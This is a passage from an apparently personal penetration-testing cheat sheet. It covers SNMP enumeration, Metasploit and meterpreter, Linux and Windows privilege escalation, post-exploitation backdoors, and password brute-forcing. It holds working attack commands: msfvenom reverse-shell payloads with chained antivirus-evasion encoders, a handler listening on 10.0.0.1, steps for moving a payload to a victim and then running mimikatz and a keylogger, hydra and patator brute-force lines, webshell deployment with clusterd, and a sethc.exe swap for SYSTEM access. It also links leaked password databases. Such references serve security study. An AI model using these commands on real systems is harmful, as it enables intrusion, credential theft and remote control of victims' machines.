    * [ettercap](https://ettercap.github.io/ettercap/) ([Man in the Middle/Wired/ARP Poisoning with Ettercap](https://charlesreid1.com/wiki/Man_in_the_Middle/Wired/ARP_Poisoning_with_Ettercap))

* {:.dummy} [yersinia](http://www.yersinia.net/) - network tool designed to take advantage of some weakeness in different network protocols (cdp, dhcp, dot1q, dot1x, dtp, hsrp, isl, mpls, stp, vtp)
* {:.dummy} [ip-tools](https://www.ks-soft.net/ip-tools.rus/index.htm) - collection of utilities to work with network under windows

<br>

### SNMP (ports 161/udp, 162/udp)

*check for snmp scanners section: [security scanners]({{ "/infosec/tools.html#security-scanners" | prepend: site.baseurl }})*

SNMP design: *SNMP agent <-> SNMP manager <-> MIB database*

Tools:

* ***snmpwalk***
    <br> `snmpwalk -c public -v1 192.168.38.53`
    <br> `snmpwalk -v 3 -l noAuthNoPriv -u admin 10.0.0.2`
    <br> `snmpwalk -v 3 -u admin -a MD5 -A password -l noAuthNoPriv 10.0.0.2 iso.3.6.1.2.1.1.1.0`
* ***snmp-check*** - `snmp-check -c pass 127.0.0.1`
* msfconsole - `search snmp`

SNMPv3: [snmpwn](https://github.com/hatlord/snmpwn) - snmpv3 user enumerator and attack tool
<br> `snmpwn --hosts /root/hosts.txt --users=/root/users.txt --passlist=/root/passlist.txt --enclist=/root/passlist`

SNMP spoofing: [nccgroup/cisco-snmp-slap](https://github.com/nccgroup/cisco-snmp-slap) - bypass Cisco ACL (firewall) rules

<!-- 
Lectures about snmp !!!:

* [network protocols: SNMP (intro) (youtube)](https://www.youtube.com/watch?v=8WtqD1Du_IY)
* [network protocols: SNMP (обход правил фаерволла) (youtube)](https://www.youtube.com/watch?v=v5CFtlUs-NY)
* [network protocols: SNMP (snmp version 3) (youtube)](https://www.youtube.com/watch?v=EnhC5sE2D8o)
 -->

<br>

### wireless (SIM, RFID, Radio)

* [SIMTester](https://opensource.srlabs.de/projects/simtester) - sim-card tests for various vulnerabilities
* [Proxmark3](https://github.com/Proxmark/proxmark3/wiki) – a powerful general purpose RFID tool, the size of a deck of cards, designed to snoop, listen and emulate everything from Low Frequency (125kHz) to High Frequency (13.56MHz) tags
* [GNU Radio](https://www.gnuradio.org/) - toolkit for software radio

<br>

### other tools

* [p0fv3](http://lcamtuf.coredump.cx/p0f3/) - tool that utilizes an array of sophisticated, purely passive traffic *fingerprinting* mechanisms to identify endpoints (OS)
* [PCredz](https://github.com/lgandx/PCredz) - This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.
* [Cain & Abel](http://www.oxid.it/cain.html) - [docs](http://www.oxid.it/ca_um/) – can recover passwords by sniffing the network, cracking encrypted passwords using dictionary, bruteforce and cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, revealing password boxes, uncovering cached passwords and analyzing routing protocols
* [***scapy***](http://www.secdev.org/projects/scapy/) ([scapy (github)](https://github.com/secdev/scapy)) - powerfull interactive packet manipulation program, written in python ([tutor](http://www.secdev.org/projects/scapy/doc/usage.html#interactive-tutorial))
* [Sparta](http://sparta.secforce.com/) (network infrastructure penetration testing tool) - sparta controls other tools like nmap, hydra, nikto, etc. (simplify network penetration testing)

<br>

---

## Privilege Escalation / PostExploitation (Linux / Windows)

*   [***Metasploit***](https://www.metasploit.com/)

    *   [Metasploit unleashed](https://www.offensive-security.com/metasploit-unleashed/) (you can also try to download "metasploit unleashed" book)

        [Using the Database in Metasploit](https://www.offensive-security.com/metasploit-unleashed/using-databases/)

        ``` bash
        bash> service postgresql start
        bash> msfdb init
        bash> msfconsole
        msf> db_status
        msf> db_rebuild_cache
        msf> help / db_status / show –h / set
        ```

        ```
        msf> set verbose true
        msf> show -h
        msf> set
        ```

    *   [meterpreter](http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics), usage:
    
        1. using `msfvenom` for payload generation, e.g. `msfvenon -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.1 lport=12344 -f exe > r.exe`
        2. moving payload to victim and execute it
        3. msfconsole: `use exploit/multi/handler`
        4. set variables `PAYLOAD`, `LHOST`, `LPORT`
        5. `> exploit` -> opens meterpreter (in effect - remote shell)
        6. `> sysinfo / getuid / getsid / ps / migrate / use priv / getsystem / run winenum / shell / load mimikatz + wdigest / ... / help` - you can do a lot of things, ..., install keylogger, make screenshots, ...
        7. ***`wdigest`, `mimikatz command -f seruklsa::searchPasswords`, `ssp`***

    *   [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) shellcode/payload generator
        <br> fast example: `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=12344 -f c --platform windows -a x86 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 5`

        <br>
        msfvenom help:

        ``` bash
        msfvenom --help-formats # list supported output formats
        msfvenom --help-platforms # list supported platforms
        msfvenom -l payloads|encoders|nops|all # list available payloads|encoders|nops|all
            ## best encoder is usually `x86/shikata_ga_nai`
            ## for payloads search better use msfconsole for search and selection
        ## --smallest - generate the smallest possible payload
        ```

        Connecting with meterpreter:

        ``` bash
        msf> use exploit multi/handler
        msf> set payload windows/meterpreter/reverse_tcp
        msf> set lhost 10.0.0.1
        msf> set lport 12344
        msf> exploit -j # -j option is to keep all the connected sessions in the background
        ```

        msfvenom encoders can be chained, e.g.:

        ``` bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=12344 -f raw -e x86/shikata_ga_nai -i 3 | \
        msfvenom -a x86 --platform windows -e x86/countdown -i 5  -f raw | \
        msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 8 -f exe -o payload.exe
        ```

    * [msfpc](https://github.com/g0tmi1k/mpc) - msfvenom payload creator (user-friendly msfvenom wrapper)

        * [Veil 3.0  Framework](https://github.com/Veil-Framework/Veil) - tool designed to generate metasploit payloads that bypass common anti-virus solutions.
        * [TheFatRat](https://github.com/Screetsec/TheFatRat) - massive exploiting tool targeted at Windows exploitation - *very user-friendly* (looks like instrument is just using metasploit, Veil, ..., but no additional technics in it) ([usage example](http://www.yeahhub.com/generate-100-fud-backdoor-thefatrat-windows-10-exploitation/))

    *   **Autopwn**
        
        [apt2](https://github.com/MooseDojo/apt2) - *An Automated Penetration Testing Toolkit* - it uses metasploit to automatically enumerate exploits again targets (can import nmap, nessus or nexpose scans) (safety mode can be set) (nmap can be run automatically)

        ``` bash
        msfconsole
        > msgrpc

        vim /usr/share/apt2/default.cfg

        # Print available modules
        apt2 --listmodules

        apt -vv -b -s 5 -C CustomConfig.cfg -f NmapOrNessusOrNexpose.xml
        # Will run nmap automatically:
        apt -vv -b -s 5 --target 192.168.1.0/24
        ```

        metasploit autopwn [video example](https://www.youtube.com/watch?v=V-JBUXtuV0Q) (`use auxiliary/server/browser_autopwn`, `use auxiliary/server/browser_autopwn2`) - autopwn runs a web-server which is used to attack remote machine (e.g. user opened that web-server) trying various available exploits
        
        ``` bash
        db_nmap 192.168.1.71
        load db_tracker
        db_hosts

        db_autopwn -p -t -e
        sessions -l
        ```

* [***fuzzbunch***](https://github.com/fuzzbunch/fuzzbunch) - NSA finest tool - brilliant analog of metasploit leaked from NSA
* [searchsploit](https://www.exploit-db.com/searchsploit/) - tool for searching exploits on [exploit-db.com](http://www.exploit-db.com) locally

#### postexploitation

* [tsh](https://github.com/creaktive/tsh) - tinyshell - an open-source UNIX backdoor that compiles on all variants, has full pty support, and uses strong crypto for communication
* [sbd](http://sbd.sourceforge.net/) - secure backdoor
* [brootkit](https://github.com/cloudsec/brootkit) - lightweight rootkit implemented by bash shell scripts v0.10
* Key loggers (*this list must be improved to proper condition*):
    <br> SC-KeyLog
    <br> [sniffMK](https://github.com/objective-see/sniffMK) - MacOS keylogger (+ mouse)

<br>

### exploit databases

* [exploitsearch.net](http://www.exploitsearch.net/) - exploits aggregator
* [exploit-db.com](http://www.exploit-db.com/) - offensive security exploit db
* [0day.today](http://en.0day.today/) - exploit database (free and paid)

<br>

* [Vulners](https://vulners.com/) - vulnerability database with smart search and machine-readible output
* [rapid7 metasploit modules](http://www.rapid7.com/db/modules/) - vulnerability database and metasploit exploits database
* [kernel-exploits.com](https://www.kernel-exploits.com/) - kernel linux exploits for privilege escalation
* [cxsecurity.com](http://cxsecurity.com/) - vulnerabilities database
* [WPScan Vulnerability Database](https://wpvulndb.com/) - wordpress vulnerability db
* [securitylab.ru (RU)](https://www.securitylab.ru/poc/) - search for exploits/vulnerabilities

<br>

* search for CVE: [cvedetails.com](http://www.cvedetails.com/), [NVD](https://web.nvd.nist.gov/view/vuln/search), [mitre](https://cve.mitre.org/cve/cve.html)
* [virusshare.com](https://virusshare.com/) - viruses db

### Linux privilege escalation

Instruments:

* [linuxprivchecker](https://www.securitysift.com/download/linuxprivchecker.py)
* [LinEnum](https://github.com/rebootuser/LinEnum) ([high-level summary of the checks/tasks performed by LinEnum](http://www.rebootuser.com/?p=1758))
* [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
* [Linux exploit suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
* [Dirty cow](https://dirtycow.ninja/) - (CVE-2016-5195) - Linux Privilege Escalation vulnerability ([dirtycow PoC](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs))
* {:.dummy} [Overlayfs privilege escalation](https://www.exploit-db.com/exploits/39166/) - linux kernel <= 4.3.3
* {:.dummy} [exploit-suggester](http://pentestmonkey.net/tools/audit/exploit-suggester) - suggest exploits for Solaris

<br>

* `cat /etc/crontab`
* `cat /etc/passwd | grep bash | cut -d ':' -f 1` - get all users with bash login
* `sudo -l` - get commands, available to run

Articles about basic linux privilege escalation:

* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [Privilege Escalation on Linux with Live examples](http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref)
* {:.dummy} [linux privilege escalation scripts](http://netsec.ws/?p=309) - 3 scripts for detecting possibilities for privilege escalation (LinEnum, LinuxPrivChecker, g0tmi1k’s Blog)

#### Linux containers / docker

* [Abusing Privileged and Unprivileged Linux Containers (2016)](https://www.nccgroup.trust/us/our-research/abusing-privileged-and-unprivileged-linux-containers/)
    <br> Compile from inside: `gcc -g -Wall secopenchroot.c -o secopenchroot`
    <br> Run: `./secopenchroot /tmp "02 00 00 00 00 00 00 00"`

**Docker security**:

* [docker security](https://docs.docker.com/engine/security/security/)
* [cr0hn/dockerscan](https://github.com/cr0hn/dockerscan) - docker attacking (firstly) and analysis tools
* [coreos/clair](https://github.com/coreos/clair) - static analysis of vulnerabilities in application containers 
* [docker security scanning](https://docs.docker.com/docker-cloud/builds/image-scan/)
* [docker/docker-bench-security](https://github.com/docker/docker-bench-security) - a script that checks for dozens of common best-practices around deploying Docker containers in production

<br>

### Windows privilege escalation (TO BE FUNDAMENTALLY IMPROVED)

* [***Password hashes dump tools***](https://docs.google.com/spreadsheets/d/1e_QKvVml3kt6-KrlqaH6vJ6T8g4CgXmHgSjJZMoLsLA/edit#gid=0) - ***awesome*** list of utilities, usable for various attack on windows systems to get login/hash/passwd from memory

<br>

* approaches to root system during boot process
    
    * [Kon-Boot](http://reboot.pro/topic/17157-conboot-unattended-win2kxp2k3vista72k8-password-bypass/) - boot CD that allows you to easily and quietly bypass password protection.
    * root system by substitution of `c:\windows\system32\sethc.exe` (sealing ***shift*** key) to `c:\windows\system32\cmd.exe` (you will become *NT AUTHORITY\SYSTEM*)

<br>

* [BeRoot](https://github.com/AlessandroZ/BeRoot) - windows privilege escalation tools
* [Windows exploits](https://github.com/WindowsExploits/Exploits) - a curated archive of compiled and tested public Windows exploits (CVE-2012-0217, CVE-2016-3309, CVE-2016-3371, CVE-2016-7255, CVE-2017-0213, ...) 
* [WindowsExploits](https://github.com/abatchy17/WindowsExploits) - windows exploits, mostly precompiled.
* [Privilege Escalation](https://github.com/AusJock/Privilege-Escalation) - contains common local exploits and enumeration scripts ([PrivEsc Windows](https://github.com/AusJock/Privilege-Escalation/tree/master/Windows))

<br>

* [windows-privesc-check](http://pentestmonkey.net/tools/windows-privesc-check) - script for detecting opportunities for privilege escalation

Windows postexploitation:

* [PowerSploit](https://github.com/mattifestation/PowerSploit) - a PowerShell Post-Exploitation Framework
* [PowerShell Empire](https://www.powershellempire.com/) ([powershell empire (github)](https://github.com/EmpireProject/Empire)) - a PowerShell and Python post-exploitation agent
* [Koadic](https://github.com/zerosum0x0/koadic) - *COM Command & Control* - post-exploitation rootkit (similar to Powershell Empire, Meterpreter, ...). It does most of its operations using Windows Script Host (a.k.a. JScript/VBScript) (***NO*** *PowerShell*) (with compatibility to Windows 2000, ... Windows 10) (+ compatibility with Python 2 and 3)


**Credentials / tickets / tokens / hashes / passwords - stealing / extracting**:

* [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki) – extract plaintexts passwords, hash, PIN code and kerberos tickets from windows memory
* [PwDump](http://www.openwall.com/passwords/windows-pwdump) - tool for extracting NTLM and LanMan password hashes from windows local SAM
* [quarkspwdump](https://github.com/quarkslab/quarkspwdump) - dump various types of Windows credentials without injecting in any process
* [WCE](http://www.ampliasecurity.com/research/wcefaq.html) –  security tool that allows to list Windows logon sessions (taken from windows memory) and add, change, list and delete associated credentials (e.g.: LM/NT hashes, Kerberos tickets and cleartext passwords)
* ***SAMInside*** – extract window's passwords hashes and brute them

    * hash storages: <= XP: `C://windows/repair/sam` and `system`
    * hash storages: > XP: `C://windows/system32/config/sam` and `system`

    `sam` – contains password's hashes, `system` – contains key used to encrypt `sam`
    <br> usually `sam.old` is accessible for user

* [HashSuite](http://hashsuite.openwall.net/download) - windows program to test security of password hashes
* [ntpasswd](http://pogostick.net/~pnh/ntpasswd/) - utility for password reset (bootdisk)

<br>

---

## BruteForce

**Utilities**:

* <u>Online bruteforce</u>:

    *   [XBruteForcer](https://github.com/Moham3dRiahi/XBruteForcer) - WordPress (autodetect username), Joomla, DruPal, OpenCart, Magento
    *   [***THC Hydra***](https://github.com/vanhauser-thc/thc-hydra) – brute force attack on a remote authentication services <small>(TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, Subversion/SVN, Firebird, LDAP2, Cisco AAA)</small>
        <br> `hydra http-form-post -U` - module help
        <br> `hydra -v -t 32 -l root -P dict.txt -o recovered.txt 10.0.0.1 -s 2222 ssh`
        <br> `hydra -v -t 32 -L usernames.txt -P dict.txt -o recovered.txt 10.0.0.1 -s 2222 ssh`

        <div class="spoiler"><div class="spoiler-title">
        <i>more usage examples</i>
        </div><div class="spoiler-text" markdown="1">
        ***http-form-post***

        ***http-get*** - basic authentication: `hydra -l admin -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/`
        </div>
        </div>

    * [***medusa***](https://github.com/jmk-foofus/medusa) - login bruteforcer <small>(AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form)</small> <br>
        `medusa -u root -P dict.txt -h 10.0.0.1 -M ssh`

    * [***patator***](https://github.com/lanjelot/patator) - login bruteforcer

        <div class="spoiler"><div class="spoiler-title">
        <i>usage examples</i>
        </div><div class="spoiler-text" markdown="1">
        ***http_fuzz***: `patator http_fuzz url=http://10.0.0.3/wp-login.php method=POST body='login=FILE0&pwd=MyPassword&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwebsite_backend%2Fwp-admin%2F&testcookie=1' before_urls=http://10.0.0.3/wp-login.php 0=/path/to/usernames.txt accept_cookie=1 follow=1 -x ignore:fgrep='Invalid username.'`

        ***http_fuzz***: `patator http_fuzz url=http://10.0.0.3/wp-login.php method=POST body='login=admin&pwd=FILE0&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwebsite_backend%2Fwp-admin%2F&testcookie=1' before_urls=http://10.0.0.3/wp-login.php 0=/path/to/passwd_list.txt accept_cookie=1 follow=1 -x ignore:fgrep='Wrong username or password' --rate-limit=0 -t 6`

        ***ftp***: `patator ftp_login host=10.0.0.2 user=FILE0 password=FILE1 0=/path/to/usernames.txt 1=/path/to/passwd_list.lst -x ignore:mesg='Permission denied.' -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500`

        ***snmp_login***: `patator snmp_login host=10.0.0.2 version=3 user=FILE0 0=/path/to/usernames.txt -x ignore:mesg=unknownUserName` - snmp login enumeration
        <br> ***snmp_login***: `patator snmp_login host=10.0.0.2 version=3 user=admin auth_key=FILE0 0=/path/to/passwd_list.txt -x ignore:mesg=wrongDigest` - snmpv3 password enumeration
        </div>
        </div>

    * [***ncrack***](https://nmap.org/ncrack/) - login bruteforcer <small>(SSH, RDP, FTP, Telnet, HTTP(S), POP3(S), IMAP, SMB, VNC, SIP, Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, WinRM and OWA)</small> <br>
        `ncrack -u user_name -P dict.txt -T 5 10.10.10.10 -p 22,ftp:3210,telnet` <br>
        `ncrack -U usernames.txt -P dict.txt -T 5 10.10.10.10 -p 22,ftp:3210,telnet`

    * [***crowbar***](https://github.com/galkan/crowbar) - it is developed to support protocols that are not currently supported by thc-hydra, ... <small>(openvpn, rdp, sshkey, vnckey)</small>

    [blog.g0tmi1k.com/dvwa/login](https://blog.g0tmi1k.com/dvwa/login/) - using hydra or patator for online bruteforce with respect to CSRF token
    <br>[g0tmi1k/boot2root-scripts (github)](https://github.com/g0tmi1k/boot2root-scripts) - scripts for brute with respect to CSRF token

    <br>

* <u>Offline bruteforce</u>:

    * [***hashcat***](https://hashcat.net/hashcat/) - advanced password recovery (OpenCL (video card)) ([hashcat + oclHashcat = hashcat (RU)](https://hackware.ru/?p=1224))

        * `hashcat64.exe -I` - get available OpenCL devices
        * `hashcat64.exe -m 100 -b` - benchmark specific hash
        * `hashcat64.exe -m 100 -w 3 -a 0 -o D:\_recovered.txt D:\hashes.txt D:\dicts\rockyou.txt` - brute through wordlist
        * `hashcat64.exe -m 100 -w 3 -a 3 -o D:\_recovered.txt D:\hashes.txt ?a?a?a?a?a?a` - brute by mask

        My favourite flags:
        
        * `-m 2500 -w 4 --status --status-timer=10` - wifi

        Specific flags:

        * `-w1-4` - set of hardware load
        * `--status --status-timer=10` - automatically update status every X seconds
        * `-j ">8"` - will find hashes with length of 10 and bigger (see more rules [here](https://hashcat.net/wiki/doku.php?id=rule_based_attack#rules_used_to_reject_plains))
        * `--potfile-disable` - disable potfile (handy for *debug* runs)
        * `--session=last` - save under session "last" - `hashcat64.exe --session=last --restore` - restore session "last"
        * etc...

    * [***JohnTheRipper***](http://www.openwall.com/john/) - password cracker (cpu only) ([JohnTheRipper hash formats (pentestmonkey)](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats))
        <br> get saved hashes: `grep 5d41402abc4b2a76b9719d911017c592 ~/.john/john.pot`
        <br> [rsmangler](https://github.com/digininja/RSMangler) - take a wordlist and perform various manipulations on it similar to those done by John the Ripper (looks like copy of JohnTheRipper's permutator)

    * [***ophcrack***](http://ophcrack.sourceforge.net/) - a free ***Windows password cracker*** based on *rainbow tables*. It is a very efficient implementation of rainbow tables done by the inventors of the method. It comes with a Graphical User Interface and runs on multiple platforms.

    * {:.dummy} [L0phtCrack 7](http://www.l0phtcrack.com/) - (after v7 it become much-more faster and expensive) – attempts to crack Windows passwords from hashes which it can obtain (given proper access) from stand-alone Windows workstations, networked servers, primary domain controllers, or Active Directory.

* <u>Other</u>

    * ***Online services***: ([top10 best hash-cracking services (raz0r.name)](http://raz0r.name/obzory/top-10-luchshix-onlajn-servisov-po-rasshifrovke-xeshej/))

        Good online services for hash recovery:
        
        * [cmd5](http://www.cmd5.ru/) - paid service, but it is worthwhile
        * [hachkiller](https://www.hashkiller.co.uk/)

        <div class="spoiler"><div class="spoiler-title">
        <i>more online services (this list becomes obsolete very fast)</i>
        </div><div class="spoiler-text" markdown="1">

        * free-of-charge:

            * [wpa-sec.stanev.org](http://wpa-sec.stanev.org/)
            * [wpa.darkircop.org](http://wpa.darkircop.org/)
            * [www.onlinehashcrack.com](http://www.onlinehashcrack.com) (simple passwords - for free, others - not)
        
        * paid:

            * [psk.do.am](http://psk.do.am)
            * [gpuhash.me](http://www.gpuhash.me/)
            * [cloudcracker.com](https://www.cloudcracker.com)
            * [tools.question-defense.com](http://tools.question-defense.com/wpa-password-cracker/) - wpa
            * [airslax.com](http://airslax.com)
            * [xsrc.ru](http://xsrc.ru)
            * [www.hashkiller.co.uk/](http://www.hashkiller.co.uk/wpa-crack.aspx)

        </div>
        </div>

        <br>

    * [woraauthbf_0.22R2](https://soonerorlater.hu/index.html?article_id=513) – the Oracle password cracker
    * {:.dummy} [fcrackzip](http://oldhome.schmorp.de/marc/fcrackzip.html) [source code](https://github.com/hyc/fcrackzip) - bruteforce zip-archives

**Wordlists**:

* most popular: *rockyou*,  *john*, 
    <br> [droope/pwlist](https://github.com/droope/pwlist/) - *ssh* bruteforce wordlist (from man's honeypot)
* [(RU) Создание и нормализация словарей. Выбираем лучшее, убираем лишнее](https://habrahabr.ru/company/pentestit/blog/337718/)
* default passwords:

    * [cirt.net](https://cirt.net/passwords) - default passwords
    * [default-passwords (SecLists)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/default-passwords.csv)
    * [default accounts wordlist](https://github.com/milo2012/pentest_scripts/tree/master/default_accounts_wordlist)
    * [netbiosX/Default-Credentials](https://github.com/netbiosX/Default-Credentials)
    * [tenable: plugins: Default unix accounts](https://www.tenable.com/plugins/index.php?view=all&family=Default+Unix+Accounts)
    * [default password list (2007-07-03)](http://www.phenoelit.org/dpl/dpl.html)

* [weakpass.com](http://weakpass.com/)
* [wordlists.capsop.com](https://wordlists.capsop.com/)
* [wiki.skullsecurity.org passwords](https://wiki.skullsecurity.org/index.php?title=Passwords) - wordlists (john, cain&abel, rockyou, ...)
* [openwall.com/pub/wordlists](http://download.openwall.net/pub/wordlists/), [openwall.com/pub/wordlists (ftp)](ftp://ftp.openwall.com/pub/wordlists/) - open collection from openwall for brute (exist bigger collection, but it is paied)
* [SecLists](https://github.com/danielmiessler/SecLists) - collection of wordlists for ***fuzzing*** (passwd, usernames, pattern-matching, URLs, fuzzing payloads, etc.)
* [duyetdev/bruteforce-database](https://github.com/duyetdev/bruteforce-database)
* [gitdigger](https://github.com/wick2o/gitdigger) - creating realworld wordlists from github hosted data.
* [Dictionaries + Wordlists (blog.g0tmi1k.com)](http://blog.g0tmi1k.com/2011/06/dictionaries-wordlists/?redirect)
* [siph0n.net](http://siph0n.net/hashdump.php)
* [berzerk0/Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists) - wordlists sorted by probability originally created for password generation and testing

* ***Enormous collections of logins/passwords raw data***:

    * *[torrent magnet uri](magnet:?xt=urn:btih:85F39F1D94917D61277725E7DA85D8177A5C12EB&dn=leaks) - 600 GB database of logins/passwords from **darknet***
    * [databases.today](https://databases.today/search.php) - free-to-download 60GB collection of publicly available leaked password databases (all dbs: [list of all these databases](https://publicdbhost.dmca.gripe/))
    * [crackstation.net](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm) - the guy collected in one file all passwords he could find in the world (was it in 2010 ?)

* [antichat.ru](https://forum.antichat.ru/threads/13640/page-12) - парни на форуме постят ссылки на словари
* [archihacker.hop.ru](http://archihacker.hop.ru/slovari_dly_bruta.html) - словари для брута

<br>

**Rulesets**:

[pw-inspector](https://tools.kali.org/password-attacks/hydra) - reads passwords in and prints those which meet the requirements

* [John The Ripper - rules](http://openwall.info/wiki/john/rules) - some rulesets for john-the-ripper
* [KoreLogic](http://contest-2010.korelogic.com/rules.html) - custom rules for generating wordlists (KoreLogic - a password cracking contest)

<br>


**Wordlists generator**:

* [cewl (digi.ninja cewl)](https://digi.ninja/projects/cewl.php) - custom word-list generator (generates wordlists based on parsed web-site (spiders a given url to a specified depth, optionally following external links, and returns a list of words))
    <br> generate wordlist: `cewl -d 3 -m 4 -w /home/phonexicum/Desktop/cewl-10.3.txt -e http://10.0.0.3/`
    <br> count and sort words on a site: `cewl -c http://10.0.0.3/`
    <br> collect e-mails: `cewl -e http://10.0.0.3/`

*   [crunch (kali)](https://tools.kali.org/password-attacks/crunch) ([RU](https://kali.tools/?p=720)) - a wordlist generator where you can specify a standard character set or a character set you specify. crunch can generate all possible combinations and permutations.
    <br> [Как создать словарь паролей используя - CRUNCH (RU)](https://h4cks4w.blogspot.ru/2015/04/crunch.html)
    
    <div class="spoiler"><div class="spoiler-title">
    <i>trivial examples</i>
    </div><div class="spoiler-text" markdown="1">
    `crunch [min_length] [max_length] [character_set] [options]` -> `crunch 8 8 0123456789 -o test.txt`

    ```
    crunch 1 1 -m cat dog pig
    catdogpig
    catpigdog
    dogpigcat
    ....
    ```
    </div>
    </div>

*   Custom script for web-page words extraction:

    <div class="spoiler"><div class="spoiler-title">
    <i>parse web-page and generate wordlist for further bruteforce (python3)</i>
    </div><div class="spoiler-text" markdown="1">

    ``` python
    #!/usr/bin/python3
    # ./parser.py http://10.0.0.3/index.html index.txt

    import re
    import requests
    import sys

    def repl(txt):
        txt = txt.replace('<!', ' ').replace('>', ' ').replace('</', ' ').replace('\n', ' ').replace('<', ' ').replace('"', ' ').replace('=', ' ').replace(':', ' ').replace('--', ' ').replace('/', ' ').replace("'", " ").replace('©', ' ').replace(',', ' ').replace('#', ' ').replace('→a', ' ').replace('?', ' ').replace('.', ' ').replace(';', ' ').replace('(', ' ').replace(')', ' ').replace('{', ' ').replace('}', ' ')
        return txt.strip()

    words = []
    url = sys.argv[1]
    req = requests.get(url).text.splitlines()
    for item in req:
        item = repl(item)
        tmp = [x.strip() for x in item.split(' ') if x.strip() != '']
        for word in tmp:
            if word not in words:
                words.append(word)

    w = open(sys.argv[2], 'w')
    for x in words:
        w.write('%s\n' %(x))
    w.close()
    ```
    </div>
    </div>

<br>

---

## Categorial/Concrete/Narrow tools/attacks

[Frida](http://www.frida.re/docs/home/) - dynamic code instrumentation toolkit
<br>&emsp; [Instrumenting Android Applications with Frida](http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html)

* [clusterd](https://github.com/hatRiot/clusterd) (kali linux) - autoexploitation of jboss|coldfusion|weblogic|tomcat|railo|axis2|glassfish with default passwords (exploitation: loading a webshell by standart app-deploy mechanism (no hacking))
    <br> `clusterd -d -i 10.0.0.2 -p 8080 --fingerprint` - fingerprint host
    <br> `clusterd -d -i 10.0.0.2 -p 8080 --deploy /usr/share/clusterd/src/lib/resources/cmd.war` - deploy app
    <br> [web-shells used for upload](https://github.com/hatRiot/clusterd/tree/master/src/lib/resources)

Database (oracle, etc.) attacks:

* [odat](https://github.com/quentinhardy/odat) – oracle database attacking tool
* [HexorBase](https://tools.kali.org/vulnerability-analysis/hexorbase) – can extract all data with known login:pass for database

[evilarc](https://github.com/ptoomey3/evilarc) - create tar/zip archives that can exploit directory traversal vulnerabilities

PDF-tools:

* [PDF analysis](https://github.com/zbetcheckin/PDF_analysis) - awesomeness
* [description](https://blog.didierstevens.com/programs/pdf-tools/): make-pdf, pdfid, pdf-parser.py, PDFTemplate.bt

SQL-browsers:

* [HiediSQL](https://www.heidisql.com/) - universal sql client (gui more-friendly) (MySQL, MSSQL and PostgreSQL browser)
* [DBeaver](https://dbeaver.jkiss.org/) - universal sql client (more functional (supports more connection types))
* [SQLiteBrowser](https://github.com/sqlitebrowser/sqlitebrowser)

Hexeditors:

* ***hexdump*** – ASCII, decimal, hexadecimal, octal dump
* [HxD](https://mh-nexus.de/en/) - hexadecimal editor
* [HexEdit](http://www.hexedit.com/) (win) – hexadecimal editor
* [Hex viewers and editors](https://twitter.com/i/moments/841916822014332930)

Serialization/deserialization:

* [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/) ([exploits (github)](https://github.com/foxglovesec/JavaUnserializeExploits)) - deserialization vulnerability for jenkins, weblogic, jboss, websphere
* [ysoserial](https://github.com/frohoff/ysoserial) - utility for generating java for exploiting deserialization vulnerabilities

<br>

Git/... (version control system) repository disembowel: [dvcs-ripper](https://github.com/kost/dvcs-ripper) - rip web accessible (distributed) version control systems: SVN/GIT/HG... (even when directory browsing is turned off)
<div class="spoiler"><div class="spoiler-title" style="display: inline-block;">
<i>Manual git-repo disembowel</i>
</div><div class="spoiler-text" markdown="1">

``` bash
git init
wget http://example.com/.git/index -O .git/index
git ls-files # Listing of git files

git checkout interest-file.txt # error with file hash: 01d355b24a38cd5972d1317b9a2e7f6218e15231
wget http://example.com/.git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy -O .git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy

git checkout interest-file.txt
# You have file
```
</div>
</div>

<br>

Attacks:

* [Invoke-PSImage](https://github.com/peewpw/Invoke-PSImage) - embeds a PowerShell script in the pixels of a PNG file and generates a oneliner to execute

Tools:

* [CCleaner](http://ccleaner.org.ua/download/) – looks into a lot of places in windows system

